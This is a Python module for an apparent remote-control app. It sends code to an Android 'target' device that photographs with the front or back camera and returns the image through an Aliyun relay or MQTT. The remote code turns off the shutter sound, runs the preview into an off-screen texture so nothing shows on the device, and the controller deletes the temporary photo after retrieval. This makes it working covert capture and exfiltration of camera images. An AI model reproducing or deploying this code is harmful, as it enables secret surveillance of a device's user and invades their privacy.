"""In-memory remote camera feature. Replaceable at runtime."""

import json
import os
import time

import client_service

FEATURE = {"name": "camera", "title": "Camera", "version": 4,
           "actions": ["probe", "capture"],
           "ui": "python", "icon": "camera"}

# 可选输出格式（界面按钮 + 落盘扩展名）。JPEG 是相机原生格式，
# PNG 在目标端用 Bitmap.compress 转码后上传。
IMAGE_FORMATS = ("jpeg", "png")
FORMAT_SUFFIX = {"jpeg": "jpg", "png": "png"}

_PHOTO_TEMPLATE = r'''import base64, json, os, sys, tempfile, time

from android.hardware import Camera
from android.graphics import Bitmap, BitmapFactory, SurfaceTexture
from java import dynamic_proxy
from java.io import ByteArrayOutputStream

try:
    import aliyun_git
except BaseException:  # 含 SystemExit：缺配置时 aliyun_git 会 sys.exit
    aliyun_git = None

facing = @@FACING@@
png = @@PNG@@
prefix = @@PREFIX@@
use_aliyun = @@ALIYUN@@

# 同一接口重复 dynamic_proxy 建类会让回调崩 _chaquopyGetType is abstract，
# 本服务进程可能多次执行本代码，类只建一次并挂在 sys 上复用。
if not hasattr(sys, "_qgb_photo_cb_cls"):
    class PhotoCallback(dynamic_proxy(Camera.PictureCallback)):
        def __init__(self):
            super().__init__()
            self.data = None
        def onPictureTaken(self, data, camera):
            if data is not None:
                self.data = bytes(data)
    sys._qgb_photo_cb_cls = PhotoCallback
PhotoCallback = sys._qgb_photo_cb_cls

camera = None
callback = PhotoCallback()
try:
    for _ in range(3):
        try:
            camera = Camera.open(@@FACING@@)
            break
        except Exception:
            time.sleep(0.5)
    if camera is None:
        raise RuntimeError("camera open failed")
    try:
        camera.enableShutterSound(False)
    except Exception:
        pass
    camera.setPreviewTexture(SurfaceTexture(10))
    camera.startPreview()
    time.sleep(1.0)
    camera.takePicture(None, None, callback)
    started = time.time()
    while callback.data is None and time.time() - started < 8:
        time.sleep(0.1)
    if callback.data is None:
        raise TimeoutError("camera capture timeout")
    data = callback.data
    if png:
        bitmap = BitmapFactory.decodeByteArray(data, 0, len(data))
        if bitmap is None:
            raise RuntimeError("jpeg decode failed, cannot convert to png")
        buffer = ByteArrayOutputStream()
        bitmap.compress(Bitmap.CompressFormat.PNG, 100, buffer)
        data = bytes(buffer.toByteArray())
        try:
            bitmap.recycle()
        except Exception:
            pass
    # 文件名：年份目录 + topic 名 + 可读到秒的时间戳，例如
    # 2026/bjhtw_20260101_120000.png
    label = ""
    for ch in str(prefix):
        if ch.isalnum() or ch in "-_":
            label += ch
        else:
            label += "_"
    label = label.strip("_") or "photo"
    current = time.localtime()
    folder = time.strftime("%Y", current)
    stamp = time.strftime("%Y%m%d_%H%M%S", current)
    suffix = "png" if png else "jpg"
    file_path = folder + "/" + label + "_" + stamp + "." + suffix
    url = ""
    upload_error = ""
    if use_aliyun and aliyun_git is not None:
        try:
            url = aliyun_git.upload(data, file_path=file_path)
        except BaseException as exc:
            upload_error = repr(exc)
    elif use_aliyun:
        upload_error = "aliyun_git unavailable on target"
    # 中转不可用/失败或用户选 MQTT：照片落到目标临时目录，App 再用
    # files.read 分块拉回（不依赖 aliyun，也不占 MQTT 单包）。
    temp_path = ""
    if not url:
        temp_root = os.path.join(tempfile.gettempdir(), "qgb_camera")
        temp_path = os.path.join(temp_root, *file_path.split("/"))
        os.makedirs(os.path.dirname(temp_path), exist_ok=True)
        with open(temp_path, "wb") as handle:
            handle.write(data)
    r = json.dumps(dict(ok=True, url=url or None, path=temp_path or None,
                        transport=("aliyun" if url else "mqtt"),
                        upload_error=upload_error, size=len(data), facing=facing,
                        format=("png" if png else "jpeg"),
                        file_path=file_path), ensure_ascii=False)
except Exception as exc:
    r = json.dumps(dict(ok=False, error=repr(exc)), ensure_ascii=False)
finally:
    if camera is not None:
        try: camera.stopPreview()
        except Exception: pass
        try: camera.release()
        except Exception: pass
'''


_PROBE_TEMPLATE = r'''import json

try:
    import aliyun_git  # noqa: F401
except BaseException as exc:  # 含 SystemExit：缺配置时 aliyun_git 会 sys.exit
    r = json.dumps(dict(ok=True, aliyun=False, error=repr(exc)), ensure_ascii=False)
else:
    r = json.dumps(dict(ok=True, aliyun=True, error=""), ensure_ascii=False)
'''


def build_probe_code():
    return _PROBE_TEMPLATE


def probe():
    """探测目标能否 import aliyun_git；不按操作系统写死。"""
    result = client_service.rpc(build_probe_code(), timeout=15)
    return json.dumps(client_service.parse_json_result(result), ensure_ascii=False)


def normalize_format(image_format):
    value = str(image_format or "").strip().lower()
    return "png" if value in ("png", "image/png", ".png") else "jpeg"


def build_photo_code(facing=0, image_format="jpeg", name_prefix="", transport="aliyun"):
    is_png = normalize_format(image_format) == "png"
    use_aliyun = str(transport or "aliyun").strip().lower() != "mqtt"
    return (_PHOTO_TEMPLATE
            .replace("@@FACING@@", str(int(facing)))
            .replace("@@PNG@@", repr(is_png))
            .replace("@@ALIYUN@@", repr(use_aliyun))
            .replace("@@PREFIX@@", json.dumps(str(name_prefix or ""), ensure_ascii=False)))


def label_from(cfg, topic):
    """文件名前缀：优先目标别名；默认占位的 "request"/"Target" 改用 topic。"""
    name = str((cfg or {}).get("name") or "").strip()
    if name and name not in ("request", "Target"):
        return name
    return str(topic or "").strip().strip("/") or name or "photo"


def capture(facing=0, image_format="jpeg", name_prefix="", transport="aliyun"):
    # 拍照 + (PNG 转码) + aliyun 或临时落盘约 5~35s；给 60s 固定超时。
    result = client_service.rpc(
        build_photo_code(int(facing), image_format, name_prefix, transport),
        timeout=60
    )
    return json.dumps(client_service.parse_json_result(result), ensure_ascii=False)


def build_view(context):
    """Chaquopy 自绘相机页（按目标设备在内存托管状态）。

    - 切 feature tab / 开覆盖页：View 常驻，状态天然不丢；
    - 切到别的目标再回来：states[key] 各自保存 facing/格式/文字/照片；
    - 文件名固定为 年份/topic名_YYYYMMDD_HHMMSS.(jpg|png)，由目标端生成；
    - 目标能 import aliyun_git 时直接走 aliyun 快路径（不弹确认条）；
      导入不到或中转失败才走 MQTT（照片先落目标临时目录再分块 read 拉回）。
    """
    import base64
    import bootstrap
    import pyui_kit
    from android.graphics import BitmapFactory
    from android.view import View
    from android.widget import LinearLayout

    page = pyui_kit.Page(
        context, "Camera",
        "Saves to <year>/<target>_YYYYMMDD_HHMMSS.(jpg|png) on the target.",
    )

    # key -> {facing, image_format, settings_loaded, status, bitmap}
    states = {}
    current = {"key": None, "topic": None, "label": ""}

    # 照片放最前面（标题之下第一屏就是图）：原生双指缩放/拖动控件，
    # 拿不到原生控件时 pyui_kit 自动回退成不能动的静态图（页面仍完整）。
    image = pyui_kit.make_zoom_image(context, height_dp=300)
    page.add(image, top=8)

    status = pyui_kit.make_text(context, "Ready", selectable=True)
    page.add(status, top=8)

    def new_state():
        return {"facing": 0, "image_format": "jpeg", "settings_loaded": False,
                "status": "Ready", "bitmap": None,
                "caps": {"checked": False, "aliyun": False, "error": ""}}

    def state_for(key):
        return states.setdefault(key, new_state())

    def back_label():
        st = state_for(current["key"]) if current["key"] else new_state()
        return ("\u2022 " if st["facing"] == 0 else "  ") + "Back camera"

    def front_label():
        st = state_for(current["key"]) if current["key"] else new_state()
        return ("\u2022 " if st["facing"] == 1 else "  ") + "Front camera"

    def jpeg_label():
        st = state_for(current["key"]) if current["key"] else new_state()
        return ("\u2022 " if st["image_format"] == "jpeg" else "  ") + "JPEG"

    def png_label():
        st = state_for(current["key"]) if current["key"] else new_state()
        return ("\u2022 " if st["image_format"] == "png" else "  ") + "PNG"

    back = pyui_kit.make_button(context, "Back camera", lambda: None)
    front = pyui_kit.make_button(context, "Front camera", lambda: None)
    jpeg_button = pyui_kit.make_button(context, "JPEG", lambda: None)
    png_button = pyui_kit.make_button(context, "PNG", lambda: None)
    shutter = pyui_kit.make_button(context, "Capture", lambda: None)

    format_row = pyui_kit.make_hrow(context)
    format_row.addView(jpeg_button, LinearLayout.LayoutParams(0, pyui_kit.wrap(), 1.0))
    png_row_params = LinearLayout.LayoutParams(0, pyui_kit.wrap(), 1.0)
    png_row_params.leftMargin = pyui_kit.dp(context, 6)
    format_row.addView(png_button, png_row_params)
    page.add(format_row, top=6)

    def paint():
        st = state_for(current["key"])
        status.setText(st["status"])
        if st["bitmap"] is not None:
            image.setImageBitmap(st["bitmap"])
            image.setVisibility(View.VISIBLE)
        else:
            image.setVisibility(View.GONE)
        back.setText(back_label())
        front.setText(front_label())
        jpeg_button.setText(jpeg_label())
        png_button.setText(png_label())

    def persist(key, values):
        payload = json.dumps(values)

        def work():
            return client_service.update_feature_settings("camera", payload, key)

        pyui_kit.run_async(work)

    def select_facing(value):
        key = current["key"]
        if not key:
            return
        st = state_for(key)
        st["facing"] = int(value)
        paint()
        persist(key, {"lens_facing": int(value)})

    def select_format(value):
        key = current["key"]
        if not key:
            return
        st = state_for(key)
        st["image_format"] = normalize_format(value)
        paint()
        persist(key, {"image_format": st["image_format"]})

    def load_settings(key):
        st = state_for(key)
        if st["settings_loaded"]:
            return
        st["settings_loaded"] = True

        def work():
            raw = client_service.feature_settings("camera", key)
            try:
                values = json.loads(raw)
            except (TypeError, ValueError):
                values = {}
            try:
                facing = int(values.get("lens_facing", 0))
            except (TypeError, ValueError, AttributeError):
                facing = 0
            return facing, normalize_format(values.get("image_format", "jpeg"))

        def apply_ok(payload):
            facing, image_format = payload
            st["facing"] = facing
            st["image_format"] = image_format
            if current["key"] == key:
                paint()

        pyui_kit.run_async(work, apply_ok)

    def set_status(st, message):
        st["status"] = message
        if current["key"] and states.get(current["key"]) is st:
            paint()

    def start_capture(st, transport):
        facing = int(st["facing"])
        image_format = st["image_format"]
        label = current["label"] or "photo"
        st["status"] = "Capturing (%s) via %s ..." % (image_format, transport)
        st["bitmap"] = None
        paint()

        def work():
            raw = bootstrap.call_feature("camera", "capture", facing, image_format,
                                         label, transport)
            result = json.loads(raw)
            if not result.get("ok"):
                return (pyui_kit.render_result(raw), None)
            url = result.get("url")
            remote_path = str(result.get("path") or "")
            data = None
            if url:
                data = base64.b64decode(client_service.download_transfer_base64(url))
            elif remote_path:
                # 目标没有 aliyun 或用户选 MQTT：照片在目标临时目录，
                # 复用 files feature 的 256KiB 分块 read 拉回。
                import feature_files as files_feature
                name = os.path.basename(remote_path) or "photo.jpg"

                def on_progress(got, total):
                    if total:
                        text = ("\u2193 MQTT %s: %.2f/%.2fMB \u00b7 %.0f%%"
                                % (name, got / 1048576.0, total / 1048576.0,
                                   got * 100 // max(total, 1)))
                    else:
                        text = "\u2193 MQTT %s: %.2fMB" % (name, got / 1048576.0)
                    pyui_kit.on_main(lambda m=text: set_status(st, m))

                info = files_feature.fetch(remote_path, name, progress=on_progress)
                with open(info["path"], "rb") as handle:
                    data = handle.read()
                try:
                    bootstrap.call_feature("files", "delete", [remote_path], "", False)
                except Exception:
                    pass
            else:
                return ("Capture finished but no url/path in response\n\n"
                        + pyui_kit.render_result(raw), None)
            bitmap = None
            if data is not None:
                bitmap = BitmapFactory.decodeByteArray(data, 0, len(data))
            path = str(result.get("file_path") or "")
            head = "Saved %s \u00b7 %.1f KB \u00b7 %s" % (
                path or "on target", (result.get("size") or 0) / 1024.0,
                "aliyun" if url else "mqtt")
            if result.get("upload_error"):
                head += " \u00b7 fallback: %s" % str(result["upload_error"])[:100]
            return (head + "\n\n" + pyui_kit.render_result(raw), bitmap)

        def apply_ok(payload):
            st["status"], st["bitmap"] = payload
            paint()

        def apply_error(error):
            st["status"] = "Capture failed: %s" % error
            paint()

        pyui_kit.run_async(work, apply_ok, apply_error, buttons=(shutter,))

    def decide_transport(st):
        if st["caps"].get("checked"):
            start_capture(st, "aliyun" if st["caps"].get("aliyun") else "mqtt")
            return
        st["status"] = "Checking aliyun relay ..."
        paint()

        def work():
            raw = bootstrap.call_feature("camera", "probe")
            try:
                values = json.loads(raw)
            except (TypeError, ValueError):
                values = {"ok": False}
            return values

        def apply_ok(values):
            st["caps"] = {"checked": True, "aliyun": bool(values.get("aliyun")),
                          "error": str(values.get("error") or "")}
            if st["caps"]["aliyun"]:
                start_capture(st, "aliyun")
            else:
                st["status"] = ("Aliyun unavailable; using MQTT"
                                if not st["caps"]["error"] else
                                "Aliyun unavailable (%s); using MQTT"
                                % st["caps"]["error"][:80])
                paint()
                start_capture(st, "mqtt")

        def apply_error(error):
            st["caps"] = {"checked": True, "aliyun": False,
                          "error": str(error)[:160]}
            st["status"] = "Relay probe failed; using MQTT: %s" % str(error)[:120]
            paint()
            start_capture(st, "mqtt")

        pyui_kit.run_async(work, apply_ok, apply_error, buttons=(shutter,))

    def on_capture():
        if not current["key"]:
            return
        decide_transport(state_for(current["key"]))

    pyui_kit.click(back, lambda: select_facing(0))
    pyui_kit.click(front, lambda: select_facing(1))
    pyui_kit.click(jpeg_button, lambda: select_format("jpeg"))
    pyui_kit.click(png_button, lambda: select_format("png"))
    pyui_kit.click(shutter, on_capture)
    page.bottom_add(back)
    page.bottom_add(front)
    page.bottom_add(shutter, weight=1.0)

    def on_target(key, topic, cfg):
        current["key"] = key
        current["topic"] = topic
        current["label"] = label_from(cfg, topic)
        page.set_target("target topic: " + topic)
        state_for(key)
        load_settings(key)
        paint()

    pyui_kit.watch_target(page.root, on_target)
    return page.root
